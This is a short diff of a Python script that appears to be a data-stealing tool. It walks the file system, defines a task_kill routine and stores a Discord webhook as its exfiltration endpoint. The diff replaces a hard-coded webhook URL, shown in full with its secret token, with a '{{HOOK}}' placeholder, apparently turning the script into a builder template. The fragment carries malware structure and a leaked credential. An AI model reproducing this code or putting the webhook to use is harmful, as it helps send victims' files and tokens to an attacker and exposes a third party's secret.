@@ -24,7 +24,7 @@ for root, dirs, files in os.walk(search_pathC):
 
 home = os.path.expanduser('~')
 user = os.path.join(full_path) 
-hook = "https://discord.com/api/webhooks/1233813508907597905/g-G10KDBYHdAARXE-vQyKpR1rwh6A2McIuXsHl0PUZeAwMxXvCd0rfWq4v5t4oH8pUtX"
+hook = "{{HOOK}}"
 #search folder end
 
 def task_kill():
